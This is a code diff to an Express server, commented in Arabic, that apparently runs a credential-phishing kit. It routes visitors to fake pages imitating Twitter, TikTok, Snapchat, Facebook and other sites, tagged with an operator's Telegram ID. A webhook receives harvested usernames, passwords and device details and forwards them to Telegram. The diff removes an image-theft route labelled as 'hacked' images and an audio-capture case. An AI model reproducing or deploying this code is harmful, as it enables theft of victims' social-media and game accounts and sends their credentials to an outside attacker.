@@ -28,6 +28,36 @@ if (!BOT_TOKEN) {
   console.warn('⚠️  BOT_TOKEN غير مضبوط، سيتم محاكاة إرسال الرسائل فقط');
 }
 
+// 🔥 أهم تعديل: إضافة مصفوفة المواقع المتاحة
+const availableSites = [
+  'twitter.html',
+  'Bobji.html',
+  'tik.html',
+  'snap.html',
+  'face.html',
+  'yot.html',
+  'des.html'  // ← أضف موقع des.html هنا
+];
+
+// Middleware للتعامل مع معرفات Telegram
+app.use((req, res, next) => {
+  const pathParts = req.path.split('/').filter(part => part !== '');
+  
+  if (pathParts.length >= 2) {
+    const siteName = pathParts[0];
+    const telegramId = pathParts[1];
+    
+    const siteFile = `${siteName}.html`;
+    if (availableSites.includes(siteFile)) {
+      req.siteName = siteName;
+      req.telegramId = telegramId;
+      req.url = `/${siteFile}`;
+    }
+  }
+  
+  next();
+});
+
 // وظيفة لإرسال رسالة إلى Telegram
 async function sendToTelegram(chatId, message, fileBuffer = null, filename = null, isImage = false) {
   try {
@@ -97,17 +127,64 @@ function getMimeType(filename) {
   return mimeTypes[ext] || 'image/jpeg';
 }
 
+// ========== Routes للمواقع ==========
+
+// Route للمواقع بدون معرف Telegram
+app.get('/:siteName', (req, res) => {
+  const siteName = req.params.siteName;
+  const siteFile = `${siteName}.html`;
+  
+  if (availableSites.includes(siteFile)) {
+    res.sendFile(path.join(__dirname, 'public', siteFile));
+  } else {
+    res.status(404).send(`
+      <!DOCTYPE html>
+      <html>
+      <head><title>404 - Not Found</title></head>
+      <body>
+        <h1>404 - الموقع غير موجود</h1>
+        <p>الموقع "${siteName}" غير موجود في القائمة.</p>
+        <p>المواقع المتاحة: ${availableSites.map(s => s.replace('.html', '')).join(', ')}</p>
+      </body>
+      </html>
+    `);
+  }
+});
+
+// Route للمواقع مع معرف Telegram
+app.get('/:siteName/:telegramId', (req, res) => {
+  const siteName = req.params.siteName;
+  const telegramId = req.params.telegramId;
+  const siteFile = `${siteName}.html`;
+  
+  if (availableSites.includes(siteFile)) {
+    console.log(`🌐 طلب موقع ${siteName} مع معرف Telegram: ${telegramId}`);
+    res.sendFile(path.join(__dirname, 'public', siteFile));
+  } else {
+    res.status(404).send(`
+      <!DOCTYPE html>
+      <html>
+      <head><title>404 - Not Found</title></head>
+      <body>
+        <h1>404 - الموقع غير موجود</h1>
+        <p>الموقع "${siteName}" غير موجود.</p>
+      </body>
+      </html>
+    `);
+  }
+});
+
 // ========== Routes لـ Telegram Bot ==========
 
 // نقطة النهاية الرئيسية لاستقبال البيانات من المواقع
 app.post('/webhook', upload.any(), async (req, res) => {
   try {
     const { 
-      type,           // نوع البيانات: 'login', 'register', 'image', 'audio', etc.
-      data,           // البيانات الرئيسية
-      chatId,         // معرف Telegram
-      platform,       // المنصة
-      additionalInfo  // معلومات إضافية
+      type,
+      data,
+      chatId,
+      platform,
+      additionalInfo
     } = req.body;
 
     if (!type || !chatId) {
@@ -122,7 +199,6 @@ app.post('/webhook', upload.any(), async (req, res) => {
     let filename = null;
     let isImage = false;
 
-    // معالجة不同类型的 البيانات
     switch (type) {
       case 'login':
         const { username, password, amount, device } = typeof data === 'string' ? JSON.parse(data) : data;
@@ -156,20 +232,11 @@ app.post('/webhook', upload.any(), async (req, res) => {
         if (data.imageType) message += `\n📸 نوع الصورة: ${data.imageType}`;
         break;
 
-      case 'audio':
-        if (req.files && req.files.length > 0) {
-          fileBuffer = req.files[0].buffer;
-          filename = `audio-${Date.now()}.mp3`;
-        }
-        message = `🎵 تم تسجيل صوت جديد\n👤 المستخدم: ${data.username || 'غير معروف'}`;
-        break;
-
       default:
         message = `📨 بيانات جديدة\n${JSON.stringify(data, null, 2)}`;
         break;
     }
 
-    // إضافة المعلومات الإضافية إذا وجدت
     if (additionalInfo) {
       message += `\n📋 معلومات إضافية: ${additionalInfo}`;
     }
@@ -196,7 +263,7 @@ app.post('/webhook', upload.any(), async (req, res) => {
   }
 });
 
-// Routes القديمة (للتوافق مع الإصدارات السابقة)
+// Routes القديمة
 app.post('/send-to-telegram', async (req, res) => {
   try {
     const { playerId, password, amount, chatId, platform = "انستقرام", device } = req.body;
@@ -231,35 +298,14 @@ app.post('/send-to-telegram', async (req, res) => {
   }
 });
 
-// نقطة النهاية لاستقبال الصور
-app.post('/upload-image', upload.single('image'), async (req, res) => {
-  try {
-    if (!req.file) {
-      return res.status(400).json({ success: false, error: 'No image file provided' });
-    }
-
-    const { username, imageType, chatId } = req.body;
-    
-    let message = `🖼️ تم اختراق صورة جديدة`;
-    if (username) message += `\n👤 المستخدم: ${username}`;
-    if (imageType) message += `\n📸 نوع الصورة: ${imageType}`;
-    
-    const success = await sendToTelegram(
-      chatId, 
-      message, 
-      req.file.buffer, 
-      `image-${Date.now()}${path.extname(req.file.originalname || '.jpg')}`,
-      true
-    );
-    
-    if (success) {
-      res.status(200).json({ success: true, message: 'تم إرسال الصورة بنجاح' });
-    } else {
-      res.status(500).json({ success: false, error: 'فشل في إرسال الصورة' });
-    }
-  } catch (error) {
-    res.status(500).json({ success: false, error: 'Internal server error' });
-  }
+// نقطة النهاية للتحقق من عمل السيرفر
+app.get('/health', (req, res) => {
+  res.status(200).json({ 
+    success: true,
+    status: 'Server is running',
+    tokenConfigured: !!BOT_TOKEN,
+    availableSites: availableSites
+  });
 });
 
 // Route رئيسي بسيط
@@ -267,34 +313,14 @@ app.get('/', (req, res) => {
   res.status(200).json({ 
     success: true,
     message: 'مرحباً بك في سيرفر Telegram Bot',
-    endpoints: {
-      webhook: 'POST /webhook',
-      sendMessage: 'POST /send-to-telegram',
-      uploadImage: 'POST /upload-image',
-      health: 'GET /health'
-    }
+    availableSites: availableSites.map(s => s.replace('.html', ''))
   });
-});
-
-// نقطة النهاية للتحقق من عمل السيرفر
-app.get('/health', (req, res) => {
-  res.status(200).json({ 
-    success: true,
-    status: 'Server is running',
-    tokenConfigured: !!BOT_TOKEN,
-    timestamp: new Date().toISOString()
-  });
-});
-
-// خدمة الملفات الثابتة من مجلد public
-app.get('*', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 // بدء السيرفر
 app.listen(PORT, () => {
   console.log(`✅ Server is running on port ${PORT}`);
-  console.log(`📁 Serving static files from: ${path.join(__dirname, 'public')}`);
+  console.log(`📁 المواقع المتاحة: ${availableSites.join(', ')}`);
   if (!BOT_TOKEN) {
     console.warn('⚠️  BOT_TOKEN غير مضبوط، سيتم محاكاة إرسال الرسائل فقط');
   }
